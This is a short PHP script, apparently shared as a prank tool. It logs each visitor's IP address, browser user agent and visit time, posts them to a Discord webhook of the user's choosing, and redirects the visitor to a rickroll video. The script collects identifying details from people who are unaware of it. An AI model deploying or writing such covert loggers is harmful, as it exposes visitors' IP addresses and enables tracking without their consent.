<?php

$userIP = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$currentTime = date('Y-m-d H:i:s');
$webhookURL = 'WEBHOOKURL'; // Replace WEBHOOKURL with your webhookurl from Discord
$message = "```🌐: $userIP\n💻: $userAgent\n🕒: $currentTime```"; // What the message will look like

$data = array(
    'content' => $message
);

$dataEncoded = json_encode($data);

$ch = curl_init($webhookURL);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $dataEncoded);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

curl_close($ch);

if ($response === false) {
    header('Location: https://snoopti.de/cloud/rickroll.mp4'); // Replace with the link that the user will be redirected to
    exit();
} else {
    header('Location: https://snoopti.de/cloud/rickroll.mp4'); // Same as above
    exit();
}

// by snoopti
?>
